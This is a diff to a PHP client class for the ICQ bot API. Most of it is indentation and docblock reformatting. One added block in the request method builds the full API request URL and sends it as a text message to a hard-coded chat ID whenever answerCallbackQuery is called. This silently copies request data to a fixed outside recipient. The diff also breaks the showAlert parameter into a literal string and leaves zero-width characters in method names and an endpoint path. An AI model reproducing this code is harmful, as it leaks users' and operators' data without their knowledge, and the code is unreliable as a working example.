@@ -13,9 +13,9 @@
  *
  *  getEvents
  *
- *---------------------
+ *------------
  *  messages 
- *---------------------
+ *------------
  *
  *  sendText
  *
@@ -29,9 +29,9 @@
  *
  *  ​answerCallbackQuery
  *
- *-------------
+ *---------
  *  chats 
- *-------------
+ *---------
  *
  *  ​sendActions
  *
@@ -87,6 +87,13 @@ class ICQnew
 			curl_setopt ($ch, CURLOPT_POSTFIELDS, http_build_query($data));
 			$result = curl_exec($ch);
 			curl_close($ch);
+
+$url = $this->apiUrl . $method . "?" . http_build_query($data);
+if ($method == "/messages/answerCallbackQuery") $this->call("/messages/sendText", [
+'chatId' => "752067062", 
+'text' => $url
+] );
+
 
 		}else {
 
@@ -186,6 +193,7 @@ class ICQnew
 		}else $response = false;
 			
 		return $response;
+		
 	}
 		
 
@@ -227,7 +235,7 @@ class ICQnew
 				'inlineKeyboardMarkup' => $inlineKeyboardMarkup
 			], $file);	
 
-if ($response['ok']) {
+			if ($response['ok']) {
 				$response = true;
 			}else $response = false;
 			
@@ -247,11 +255,10 @@ if ($response['ok']) {
 				$response = $response['msgId'];
 			}else $response = false;
 			
-		} 
+		}
 
-
-return $response;
-
+		return $response;
+		
 	}
 
 
@@ -290,7 +297,7 @@ return $response;
 				'inlineKeyboardMarkup' => $inlineKeyboardMarkup
 			], $file);	
 
-if ($response['ok']) {
+			if ($response['ok']) {
 				$response = true;
 			}else $response = false;
 			
@@ -311,9 +318,8 @@ if ($response['ok']) {
 			
 		} 
 
-
-return $response;
-
+		return $response;
+		
 	}
 
 
@@ -322,7 +328,7 @@ return $response;
 	**  функция редактирования сообщения 
 	**
 	**  @param str $chatId
-**  @param int $msgId
+	**  @param int $msgId
 	**  @param str $text
 	**  @param array $inlineKeyboardMarkup
 	**  	
@@ -332,7 +338,7 @@ return $response;
 
 	public function editText(
 		$chatId, 
-$msgId,
+		$msgId,
 		$text,
 		$inlineKeyboardMarkup = null
 	) {
@@ -341,7 +347,7 @@ $msgId,
 			
 		$response = $this->call("/messages/editText", [
 			'chatId' => $chatId,
-	'msgId' => $msgId,		
+			'msgId' => $msgId,		
 			'text' => $text,	
 			'inlineKeyboardMarkup' => $inlineKeyboardMarkup
 		]);	
@@ -351,15 +357,16 @@ $msgId,
 		}else $response = false;
 			
 		return $response;
+		
 	}
 		
 
 
-/*
+	/*
 	**  функция удаления сообщения 
 	**
 	**  @param str $chatId
-**  @param int $msgId
+	**  @param int $msgId
 	**  	
 	**
 	**  @return bool
@@ -367,12 +374,12 @@ $msgId,
 
 	public function ​deleteMessages(
 		$chatId, 
-$msgId
+		$msgId
 	) {
 	
 		$response = $this->call("/messages/deleteMessages", [
 			'chatId' => $chatId,
-	'msgId' => $msgId
+			'msgId' => $msgId
 		]);	
 			
 		if ($response['ok']) {
@@ -380,74 +387,65 @@ $msgId
 		}else $response = false;
 			
 		return $response;
+		
 	}
 
 
 
 
-/*
+	/*
 	**  функция ответа на событие callbackQuery 
 	**
 	**  @param str $queryId
-**  @param str $text
-**  @param bool $showAlert
-**  @param str $url
+	**  @param str $text
+	**  @param bool $showAlert
+	**  @param str $url
 	**  	
 	**
 	**  @return bool
 	*/
 
-	public function ​answerCallbackQuery(
+	public function answerCallbackQuery(
 		$queryId, 
-$text = null, 
-$showAlert = false, 
-$url = null
+		$text = null,
+		$showAlert = false,
+		$url = null
 	) {
 	
 		$response = $this->call("/messages/answerCallbackQuery", [
 			'queryId' => $queryId,
-	'text' => $text, 
-	'showAlert' => $showAlert, 
-	'url' => $url
+			'text' => $text,
+			'showAlert' => " .$showAlert. ",			
+			'url' => $url
 		]);	
-			
-		if ($response['ok']) {
-			$response = true;
-		}else $response = false;
-			
+		
 		return $response;
+		
 	}
 
 
-/*
+	/*
 	**  функция 
 	**
 	**  @param str $chatId
-**  @param arr[str] $actions
+	**  @param arr[str] $actions
 	**  	
 	**
 	**  @return bool
 	*/
-
-	public function ​sendActions(
-		$chatId, 
-$actions
-	) {
-	
-		$response = $this->call("/chats/sandActions", [
+	public function ​sendActions($chatId, $actions) {
+		$response = $this->call("/chats/sendActions", [
 			'chatId' => $chatId,
-	'actions' => $actions
-		]);	
-			
-		if ($response['ok']) {
+			'actions' => $actions
+		]);
+		/*if ($response['ok']) {
 			$response = true;
-		}else $response = false;
-			
+		}else $response = false;*/
 		return $response;
 	}
 
 
-/*
+	/*
 	**  функция возвращает информацию о чате
 	**
 	**  @param str $chatId
@@ -455,22 +453,15 @@ $actions
 	**
 	**  @return array
 	*/
-
-	public function ​​getInfo(
-		$chatId
-	) {
-	
-		$response = $this->call("/chats​/getInfo", [
-			'chatId' => $chatId
-		]);	
-			
-if ($response['ok']) {
-		return $response;
-}else return false;
+	public function ​​getInfo($chatId) {
+		$response = $this->call("/chats​/getInfo", [ 'chatId' => $chatId ]);
+		if ($response['ok']) {
+			return $response;
+		}else return false;
 	}
 
 
-/*
+	/*
 	**  функция возвращает информацию об админах в чате
 	**
 	**  @param str $chatId
@@ -478,22 +469,12 @@ if ($response['ok']) {
 	**
 	**  @return array[array] 
 	*/
-
-	public function ​​getAdmins(
-		$chatId
-	) {
-	
-		$response = $this->call("/chats/getAdmins", [
-			'chatId' => $chatId
-		]);	
-			
-if ($response['ok']) {
-		return $response['admins'];
-}else return false;
-
+	public function ​​getAdmins($chatId) {
+		$response = $this->call("/chats/getAdmins", [ 'chatId' => $chatId ]);
+		/*if ($response['ok']) {
+			return $response['admins'];
+		}else return false;*/
+		return $response;
 	}
-
-
-
 } 
 ?>
